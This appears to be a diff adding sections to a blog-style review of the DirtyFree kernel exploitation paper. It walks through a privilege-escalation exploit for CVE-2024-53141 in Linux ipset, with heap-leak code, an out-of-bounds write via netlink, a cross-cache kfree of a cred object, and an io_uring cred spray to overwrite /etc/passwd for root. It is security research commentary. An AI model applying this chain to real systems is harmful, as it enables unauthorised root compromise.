@@ -408,4 +408,253 @@ gef> slab-contains 0xffff9ce542b6d180
 
 ## Arbitrary Free Object
 
-TBD
+To satisfy AFO, there are two key requirements:
+1. There is a `ptr` pointing into the heap area, and there is a way to `kfree()` it (not `kmem_cache_free()`, since that inspects metadata and blows up if it doesn't match).
+2. It can be allocated and freed by a low-privileged user.
+
+On top of that, a sufficiently long window between allocation and free can significantly improve exploitability.
+
+When hunting for AFO, the authors mainly tracked all `kfree()` variants and checked whether they could be triggered from userspace.
+
+For each candidate, they checked whether the `ptr` is a local variable with a `kmalloc` in the same context — such temporary vars are dropped, since the window isn't long enough. After that, they continued with backward data-flow tracking and ultimately selected objects that don't live in the stack or global memory region.
+
+> Put plainly, they look for the kind of `Obj->ptr` where `Obj` is allocated in the heap area, and both allocation and free are reachable through controllable calls.
+
+Then they filter further: drop `Obj`s in dedicated caches, drop temporary `Obj`s, and finally drop privileged calls — what's left is usable.
+
+> Actually, temporary `Obj`s aren't entirely unusable: if there's a `copy_to_user()` during allocation and deallocation, you can use something like FUSE to stretch the time window. The authors didn't filter those out.
+
+In the end this covers objects across basically every size cache ~~the `msg_msg` concept reigns supreme as always~~
+![image](https://cdn.nova.gal/img/vscode_picgo_1780485557983.png)
+
+## Case Study
+
+I haven't touched this in over two months. Back when I read it I still had plenty of doubts 🤔, but I can't recall them now. Rethinking it today:
+1. Roughly, the publicly disclosed cases can all be exploited in multiple ways; the one case that nothing else can hit but DirtyFree can isn't disclosed.
+2. They all require read + write primitives to leak and to overwrite the pointer, yet the paper claims it only needs a single Arbitrary Free primitive. (However you spin it, that's just how primitives are defined — if I insist your leak is part of the primitive too, there's nothing you can do about it.)
+3. It supposedly needs neither AAW nor AAR, but it actually uses a fixed offset to compute the location of `cred`. On my machine at least it doesn't work, so reliability is hard to say.
+
+### Analyze
+
+In short, let's look at CVE-2024-53141, an out-of-bounds vulnerability. In `net/netfilter/ipset/ip_set_bitmap_ip.c` there's an operation that uses `bitmap:ip` to represent an IP range as a bitmap.
+
+> I debugged this before but have forgotten the details — just read the AI explanation.
+
+```c
+/* Type structure */
+struct bitmap_ip {
+	unsigned long *members;	/* the set members */
+	u32 first_ip;		/* host byte order, included in range */
+	u32 last_ip;		/* host byte order, included in range */
+	u32 elements;		/* number of max elements in the set */
+	u32 hosts;		/* number of hosts in a subnet */
+	size_t memsize;		/* members size */
+	u8 netmask;		/* subnet netmask */
+	struct timer_list gc;	/* garbage collection */
+	struct ip_set *set;	/* attached to this ip_set */
+	unsigned char extensions[]	/* data extensions */
+		__aligned(__alignof__(u64));
+};
+
+/* ADT structure for generic function args */
+struct bitmap_ip_adt_elem {
+	u16 id;
+};
+```
+
+In the function `bitmap_ip_uadt`, after the CIDR step `ip` gets rewritten, but it is never re-checked against `ip >= map->first_ip`, so `ip_to_id` ends up processing addresses below `map->first_ip`.
+
+```c
+// ① First bounds check: uses the original ip
+if (ip < map->first_ip || ip > map->last_ip)
+    return -IPSET_ERR_BITMAP_RANGE;
+// ip = 0xFFFFFFFF, first_ip = 0xFFFFFFCB → check passes ✓
+
+// ② CIDR mask: ip is rewritten to the network address (a completely different value!)
+} else if (tb[IPSET_ATTR_CIDR]) {
+    u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);
+    ip_set_mask_from_to(ip, ip_to, cidr);
+    // CIDR=3: ip = 0xFFFFFFFF & 0xE0000000 = 0xE0000000
+    //         ip_to = 0xFFFFFFFF
+}
+
+// ③ Only ip_to's upper bound is checked; ip's lower bound is never re-checked
+if (ip_to > map->last_ip)
+    return -IPSET_ERR_BITMAP_RANGE;
+// 0xFFFFFFFF > 0xFFFFFFFF → FALSE → passes ✓
+
+// ④ The loop starts from ip=0xE0000000, with no ip >= first_ip constraint!
+for (; !before(ip_to, ip); ip += map->hosts) {
+    e.id = ip_to_id(map, ip);   // ← OOB happens here
+    ret = adtfn(set, &e, &ext, &ext, flags);
+    ...
+}
+```
+
+Inside `ip_to_id`:
+```
+static u32 ip_to_id(const struct bitmap_ip *m, u32 ip)
+{
+    return ((ip & ip_set_hostmask(m->netmask)) - m->first_ip) / m->hosts;
+}
+```
+
+When ip = 0xE0000000, first_ip = 0xFFFFFFCB, netmask = 32, hosts = 1:
+
+
+id (u32) = 0xE0000000 - 0xFFFFFFCB = 0xE0000035   (unsigned underflow wraparound)
+
+When stored back into `bitmap_ip_adt_elem`, the id gets truncated:
+id (u16) = 0x0035 = 53.
+
+The map is allocated as `map = ip_set_alloc(sizeof(*map) + elements * set->dsize);`, i.e. `[0, elements-1]`, which here is exactly `[0, 0x34]` — so there's one slot we can write out of bounds.
+
+### Exploit
+The exploit has three stages; the full flow:
+
+
+Stage 1: OOB read → leak heap address
+Stage 2: OOB write → construct arbitrary free
+Stage 3: DirtyFree → cross-cache free + root cred replacement
+
+
+#### Heap Leak
+
+Target cache: kmalloc-cg-512
+
+Craft a `bitmap:ip` map whose size lands precisely in kmalloc-cg-512:
+
+```c
+size = sizeof(struct bitmap_ip) + 0x35 × dsize_comment
+     = 0x58 + 0x35 × 0x8 = 0x200  →  kmalloc-cg-512 ✓
+```
+
+Heap layout preparation:
+
+
+`[msg_msgseg] [msg_msgseg] ... [bitmap:ip map] [msg_msgseg] [msg_msgseg] ...`
+                                    
+OOB write (with the COMMENT extension flag):
+
+
+```c
+map->extensions[0x35] = get_ext(map, id=0x35)
+                       ↕
+start of adjacent msg_msgseg
+```
+
+The COMMENT extension writes a kernel heap pointer to the comment string buffer into the ext region. That pointer gets written into the data region of the adjacent msg_msgseg, and later, when reading the message back via `msgrcv`, scanning for values matching the `0xffff...` pattern yields a kernel heap address:
+
+```c
+// Leak scan
+for(int j = 0; j < MSG_SIZE; j += 8) {
+    if((msg.mtext[j] & 0xffff000000000000) == 0xffff000000000000) {
+        heap_leak_addr = msg.mtext[j];
+        break;
+    }
+}
+
+// Derive cred location from the leaked address (relies on a fixed offset)
+cred_addr = (heap_leak_addr & 0xfffffffffff00000) | 0x68e40;
+```
+
+#### OOB
+Target cache: kmalloc-cg-2048
+
+Craft a larger `bitmap:ip` map:
+
+```c
+size = sizeof(struct bitmap_ip) + 0x7a × dsize_counter
+     = 0x58 + 0x7a × 0x10 = 0x7F8  →  kmalloc-cg-2048 (slot 0x800)
+```
+Again, spray msg_msgseg in adjacent positions (this time the msg_msgseg also lands in kmalloc-cg-2048).
+
+OOB write (with the COUNTER extension flag):
+
+The COUNTER extension stores bytes/packets counters in the ext region, written directly as 64-bit values. The attacker passes `cred_addr` as the counter value:
+
+```c
+// Trigger the OOB write
+mnl_attr_put_u64(nlh, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER,
+                 bswap_64(cred_addr));    // ← write the cred address
+mnl_attr_put_u64(nlh, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER,
+                 bswap_64(cred_addr));
+```
+
+When `e->id = 0x7A`, the OOB write hits the start of the next slot:
+
+```
+bitmap:ip map (0x7F8 bytes)
++---+---+---+...+---+  ← end of map allocation (slot 0x800 has 0x8 bytes left)
+                    ↓OOB (+0 bytes, start of next slot)
+```
+adjacent msg_msgseg->next = cred_addr   ← overwritten!
+msg_msgseg struct:
+
+```
+struct msg_msgseg {
+    struct msg_msgseg *next;  // offset 0 ← written to cred_addr here
+    char data[];
+};
+```
+
+#### DirtyFree
+Trigger the arbitrary free:
+
+```c
+msgctl(msqid[i], IPC_RMID, NULL);
+// → freeque()
+// → free_msg()
+// → kfree(msg_msgseg->next)   ← msg_msgseg->next == cred_addr
+// → kfree(cred_addr)          ← frees the cred object!
+```
+
+This is a cross-cache free: `free_msg` calls `kfree(cred_addr)` in the kmalloc-cg-2048 context, while the cred object belongs to the kmalloc-192 cache.
+
+```c
+kmalloc-192 freelist:  ... → [cred_addr] → ...
+                                  ↑
+                           cred object spliced into the freelist
+```
+The kernel triggers an oops at this point (as `free_msg` keeps walking the list, it dereferences `cred->usage = 1` as a pointer), but the child processes are already in position before that:
+
+```c
+Child process (io_uring personality holds a reference to the user cred)
+  ↓ msgctl triggers kfree(cred_addr)
+  ↓ fork a swarm of sudo processes → root cred allocated, landing in the freed slot
+  ↓ io_uring personality still points to cred_addr
+  ↓ io_uring OPENAT with personality → executes with root cred
+  ↓ write /etc/passwd → get a root shell
+```
+
+### Overview
+```c
+create_ip_set (kmalloc-cg-512, elements=0x35, WITH_COMMENT)
+│
+├─ spray msg_msgseg (kmalloc-cg-512, adjacent fill)
+│
+├─ trigger_oob_leak (ip=0xFFFFFFFF, CIDR=3)
+│    ip_to_id(0xE0000000) = 0xE0000035 → u16 truncate → 0x0035
+│    OOB write: extensions[0x35] = comment ptr → overwrites adjacent msg_msgseg data
+│    msgrcv reads out the leaked address → compute cred_addr
+│
+create_ip_set (kmalloc-cg-2048, elements=0x7a, WITH_COUNTERS)
+│
+├─ spray msg_msgseg (kmalloc-cg-2048, adjacent fill)
+│
+├─ trigger_oob_write (ip=0xFFFFFFFF, CIDR=3, bytes/packets=cred_addr)
+│    ip_to_id(0xE0000000) = 0xE0000035 → ... → 0x7A (different set parameters)
+│    OOB write: extensions[0x7A] = cred_addr → overwrites adjacent msg_msgseg->next
+│
+├─ msgctl(IPC_RMID) → free_msg() → kfree(cred_addr)  [cross-cache free]
+│
+└─ root cred spray → occupy the freed cred slot → root shell
+```
+
+## Comments
+
+Arbitrary Free isn't really a particularly novel exploitation technique, but this paper analyzes it fairly systematically and provides a relatively easy-to-use workflow, offering another option for everyday kernel exploitation. That said, I personally find its reliability not that high — there's no way it reaches the 95+% idle success rate the paper claims; it's barely usable at best. The key innovation is probably the ability to do cross-cache free, which is a step up from DirtyCred.
+
+Beyond that, in terms of paper writing — offensive papers all seem to be written this way: lift an exploitation technique from kCTF, give it a name, hit a few real cases, do a comparison, systematically analyze the primitive, and finally throw in a defense. Same old formula.
+
+> btw the io_uring cred spray setup also feels like it's straight out of DirtyCred. Nice mashup.
